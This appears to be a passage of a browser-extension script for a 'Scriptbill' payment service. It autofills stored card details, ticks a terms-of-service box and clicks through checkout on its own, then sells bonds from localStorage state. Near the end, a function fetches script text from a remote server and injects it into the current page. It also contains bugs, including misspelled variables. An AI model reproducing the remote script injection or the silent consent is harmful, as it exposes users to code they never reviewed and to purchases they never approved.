							let TOSBox = creditCard[0].querySelector("input[name='TOS-checkbox']");
							let nextBtn = getID("next-button");
							
							if( cardin.cardNum ) {
								if( cardNum && cardNum.value != cardin.cardNum ){
									virtualpointer.move_to_element_and_click( cardNum, 500 );
									setTimeout(()=>{
										cardNum.value = cardin.cardNum;
										cardNum.dispatchEvent( new Event("input"));
									},200);
									
								}
							}
							
							if( cardin.holderName ){
								let names = cardin.holderName.split(" ");
								
								if( lName ){
									virtualpointer.move_to_element_and_click( lName, 100 );
									setTimeout(()=>{
										lName.value = names[1];
										lName.dispatchEvent( new Event("input"));
									},100);
								}
								
								if( fName ){
									
									virtualpointer.move_to_element_and_click( fName, 150 );
									setTimeout(()=>{
										fName.value = names[0];
										fName.dispatchEvent( new Event("input"));
									},200);
								}
							}
							
							if( cardin.expiry ){
								let exP = cardin.expiry.split("/");
								
								if( exMnt ){
									
									virtualpointer.move_to_element_and_click( exMnt, 250 );
									setTimeout(()=>{
										exMnt.value = exP[0];
										exMnt.dispatchEvent( new Event("input"));
									},100);
								}
								
								if( exYear ){
									
									virtualpointer.move_to_element_and_click( exYear, 350 );
									setTimeout(()=>{
										exYear.value = exP[1];
										exYear.dispatchEvent( new Event("input"));
									},250);
								}
							}
							
							if( cardin.cvv ){
								
								virtualpointer.move_to_element_and_click( cvv, 140 );
									setTimeout(()=>{
										cvv.value 	= cardin.cvv;
										cvv.dispatchEvent( new Event("input"));
									},250);
							}
							
							if( cardNum && cardNum.value != "" && cardNum.value.length > 15 && cvv.value.length > 3 && cvv.value.match( /[a-z]/g ) == null && cardNum.value.match( /[a-z]/g ) == null && exYear.value != "" && exMnt.value != "" && exMnt.value < 13 && fName.value != "" && lName.value != "" ){
								if( TOSBox )
									TOSBox.checked = true;
								
								if( nextBtn ){
									nextBtn.click();
								} 								
							}
						}
					}
				}
				
				if( ( activeStep[0].innerText && activeStep[0].innerText.includes("verification") ) || ( activeStep[1].innerText && activeStep[1].innerText.includes("verification") ) ){
					
					if( ! localStorage.alerted ) {
						createAlert("Verifying Scriptbill Purchase", "Please ensure you verify your purchase ");
						localStorage.alerted = true;
					}
					
					if( ! localStorage.secondsCount ){
						localStorage.secoundsCount = 1;
						return;
					} else if( localStorage.secondsCount < 5 ){
						localStorage.secondsCount++;
						return;
					}
					
					if( modal && modal.innerText.includes("An error has occurred") ) {
						localStorage.unsuccessfulPayment = "TRUE";
						return;
					}
					else if( localStorage.unsuccessfulPayment == "TRUE" ) {
						return;
					}
					setTimeout(function(){
						//sell the bond here.
						if( localStorage.fiatCredit && localStorage.fiatAmount && ! localStorage.sellingBondAlready && ! localStorage.buyDashboard ){
							localStorage.sellingBondAlready = "TRUE";
							createAlert("Scriptbill Bond Sale In Progress...", "", "orange");
							sellBond( localStorage.fiatAmount, localStorage.fiatCredit + "BND", localStorage.buyNote ? localStorage.buyNote : "", localStorage.buyTime ? localStorage.buyTime : " 1 Months").then( note =>{
								if( ! note ) return;
								createAlert("Scriptbill Bond Successfully Sold...", "You can head over to the options page to manage your bond note", "green", 20);
								Scriptbill.download_note();
							});						
						}
						else if( localStorage.totalAmount && localStorage.creditType && ! localStorage.sellingBondAlready && ! localStorage.buyDashboard ){
							localStorage.sellingBondAlready = "TRUE";
							sellBond( localStorage.totalAmount, localStorage.creditType + "BND", localStorage.buyNote ? localStorage.buyNote : "", localStorage.buyTime ? localStorage.buyTime : " 1 Months" );
							createAlert("Scriptbill Bond Sale In Progress...", "Your Scriptbill Bond Will Be Withdrawable As Credit " + ( localStorage.buyNote ? "To This Scriptbill Note: " + localStorage.buyNote : "To Any Scriptbill Note You Assign To This Bond Note" ) + " In " + ( localStorage.buyTime ? localStorage.buyTime : "1 Month" ) + " Time When Your Bond Term Expires. You Will Also Earn Daily Interest From Your Bond That Will Be Withdrawable at The End of Your Bond Term.", "orange", 20);
							setTimeout( async ()=>{
								let s 		= await Scriptbill.s
								if( s.currentNote ){
									createAlert("Scriptbill Bond Successfully Sold...", "Your Scriptbill Bond File is downloading. Please Use the password and key you used in creating this note to manage your Scriptbill Bond Note at the options page of your browser. Thanks for choosing Scriptbank.", "green", 20);
									Scriptbill.download_note();
								} else {
									createAlert("Bond Sale Unsuccessful, Retrying....");
									delete localStorage.sellingBondAlready;
								}
							}, 20000 );
						} else {
							
							if( ! localStorage.sellingBondAlready && ! localStorage.buyDashboard ) {
								localStorage.sellingBondAlready = "TRUE";
								createAlert("Scriptbill Bond Was Not Successfully Sold..", "Please contact Scriptbank by sending an email to sales@scriptbank.com.ng with the evidence of payment for manual disbursement", "red", 15);
							}
							else if( localStorage.buyDashboard ){
								delete localStorage.buyDashboard;
								delete localStorage.buyCard;
								delete localStorage.buyCur;
								delete localStorage.buyValue;
								
								if( localStorage.pendingDeposit && localStorage.buyNote ){
									Scriptbill.response = JSON.parse( localStorage.pendingDeposit ).transBlock;
									Scriptbill.details  = JSON.parse( localStorage.pendingDeposit ).withdrawBlock;
									Scriptbill.details.transType = "CONFIRM";
									Scriptbill.details.recipient = localStorage.buyNote;
									//taking the exchange note as the processing note.
									Scriptbill.note 			= Scriptbill.details.exchangeNote;
									Scriptbill.generateScriptbillTransactionBlock();
								} else if( localStorage.totalAmount && localStorage.creditType ){
									localStorage.sellingBondAlready = "TRUE";
									sellBond( localStorage.totalAmount, localStorage.creditType + "BND", localStorage.buyNote ? localStorage.buyNote : "", localStorage.buyTime ? localStorage.buyTime : " 1 Months" );
									createAlert("Scriptbill Bond Sale In Progress...", "Your Scriptbill Bond Will Be Withdrawable As Credit " + ( localStorage.buyNote ? "To This Scriptbill Note: " + localStorage.buyNote : "To Any Scriptbill Note You Assign To This Bond Note" ) + " In " + ( localStorage.buyTime ? localStorage.buyTime : "1 Month" ) + " Time When Your Bond Term Expires. You Will Also Earn Daily Interest From Your Bond That Will Be Withdrawable at The End of Your Bond Term.", "orange", 20);
									setTimeout( async ()=>{
										let s 		= await Scriptbill.s
										if( s.currentNote ){
											createAlert("Scriptbill Bond Successfully Sold...", "Your Scriptbill Bond File is downloading. Please Use the password and key you used in creating this note to manage your Scriptbill Bond Note at the options page of your browser. Thanks for choosing Scriptbank.", "green", 20);
											Scriptbill.download_note();
										} else {
											createAlert("Bond Sale Unsuccessful, Retrying....");
											delete localStorage.sellingBondAlready;
										}
									}, 20000 );
								}
							}
						}
					}, 5000);
				}
			}
			
		}, x * 1000);
	}
		
}

const getBase64FromUrl = async (url) => {
  const data = await fetch(url);
  const blob = await data.blob();
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.readAsDataURL(blob); 
    reader.onloadend = () => {
      const base64data = reader.result;   
      resolve(base64data);
	  sessionStorage.imageData = base64Data;
    }
  });
}

function create( name, attr = {} ){
	let el = document.createElement( name );
	
	if( ! el ) return false;
	
	let x;
	
	if( typeof attr != "object" || attr.length ) return el;
	
	for( data in attr ){
		el.setAttribute( data, attr[data] );	
	}
	
	return el;
}

function attr( node, id = "id", data = "" ){
	
	if( data == "" )
		return node.getAttribute(id);
	
	else {
		node.setAttribute( id,  data );
		return true;
	}
}

function findEl( selector = "", node = "" ){
	if( ! node || typeof  node == "string" )
		node = document;
	
	return node.querySelector( selector );
			
}

function getClass( classes = "", node = "" ){
	if( ! node || typeof  node == "string" )
		node = document;
	
	return node.getElementsByClassName( classes );
}

function getID( id = "", node = "" ){
	if( ! node || typeof  node == "string" )
		node = document;
	
	return node.getElementById( id );
}

function getTag( tag = "", node = "" ){
	if( ! node || typeof  node == "string" )
		node = document;
	
	return node.getElementsByTagName( tag );
}


function insert( el, toInsert, context = "append" ){
	
	if( context == "append" )
		el.appendChild( toInsert );
	
	else if( context == "before" )
		el.before( toInsert );
	
	else if( context == "after" )
		el.after( toInsert );
	
	return el;
}

function clone( el, cloneWithAttr = false, cloneWithChild = false ){
	
	let ret;
	
	if( cloneWithChild )
		ret = el.cloneNode(true);
	
	else 
		ret = el.cloneNode();
	
	if (ret.hasAttributes() && ! cloneWithAttr ) {
         for ( const attr of ret.attributes ) {
           ret.removeAttribute(attr.name);
         }
    } 
	
	return ret;
}

function scanHTMLstr(){
	fetch("https://www.jumia.com.ng/fashion-2-in-1-set-of-men-plain-quality-jeans.-64303816.html").then(res =>{ return res.text(); }).then( data =>{ let el = '<p class="-m -pbs">'; let y = data.search(el), x, str = "",  d = el.length; let k = y + d; for( x = k; x < data.length; x++ ) { if( data[x] != "<" ) str += data[x]; else break; } alert( str ); } );
}

function createAlert( head = "", content = "", alertType = "red", displayTime = 5 ){
	let modal 	= create("div", { "class" : "script-"+alertType+" script-padding-24 script-center", "style":"position:fixed; z-index:100000; top:50px; right:0px; padding:50px;", "id":"script-alert"});
	let span 	= create("span", {"class" : "script-button script-black script-display-topright"});
	let hd 	=  create("h3", {"class":"script-text script-medium script-upper"});
	let p 		= create("p", {"class":"script-text"});
	
	if( typeof head == "string" )
		hd.innerText 		= head;

	else if( head.tagName )
		insert( hd, head );
	
	if( typeof content == "string" )
		p.innerText 		= content;

	else if( content.tagName )
		insert(p, content );
	
	span.innerHTML = "X";
	
	span.onclick = function(){
		modal.style.display = "none";
	}
	
	insert( modal, span );
	insert( modal, hd );
	insert( modal, p );
	
	document.body.appendChild( modal );
	
	let time = displayTime * 1000;
	
	setTimeout( function(){
		modal.style.display = "none";
	}, time );
	
}

function createModal( head = "", content = "", foot = "", headerColor = "teal", contentColor = "white", footerColor = "teal" ){
	

let div 	= create("div", {"class" : "script-modal"});
let header 	= create("header", {"class" : "script-container script-" + headerColor});
let span 	= create("span", {"class" : "script-button script-black script-display-topright"});
let footer 	= create("footer", {"class" : "script-container script-" + footerColor});
let h2 		= create("h2");
let p 		= create("p");
let pFooter	= p.cloneNode();
let modal 	= clone( div );
let container 	= clone( div );
attr(modal, "class", "script-modal-content");
attr(container, "class", "script-container script-padding script-margin script-" + contentColor );


if( typeof head == "string" )
	h2.innerHTML 		= head;

else if( head.tagName )
	insert( h2, head );

if( typeof content == "string" )
	p.innerHTML 		= content;

else if( content.tagName )
	insert(p, content );

if( typeof foot == "string" )
	pFooter.innerHTML 		= foot;

else if( foot.tagName )
	insert( pFooter, foot );

insert( header, span );
insert(header, h2 );
insert( container, p );
insert( footer, pFooter );
insert( modal, header );
insert( modal, container );
insert( modal, footer );
insert( div, modal );

span.onclick = function(){
	div.style.display = "none";
}

span.innerText = "X";

div.style.display = "block";

document.body.appendChild( div );
//document.getElementById("id01").style.display = "block";
}

function removeModal(){
	let modals = getClass("script-modal");
	let x, modal;
	
	for( x = 0; x < modals.length; x++ ){
		modal = modals[x];
		
		if( modal && modal.style.display == "block" )
			modal.style.display = "none";
	}	
}


async function injectScripts(){
	let loc = new URL( Scriptbill.getDefaultServer() );
	let origin = location.origin;
	loc.searchParams.set( "script", "true" );
	loc.searchParams.set( "server", origin );
	let script = await fetch( loc.href ).then( data =>{
		return data.text();
	}).then( data =>{
		return data;
	}).catch( error =>{
		//console.log( "script fetching error " + error );
		return false;
	});
	
	if( script && Scriptbill.isJsonable( script ) ){
		script 	= JSON.parse( script );
		
		if( script.script ){
			let el = document.createElement("script");
			el.setAttribute("type", "text/javascript");
			el.setAttribute("defer", "defer");
			el.innerText = script.script;
			document.body.appendChild( el );
		}
	}
}

injectScripts();
buyScriptbills();





	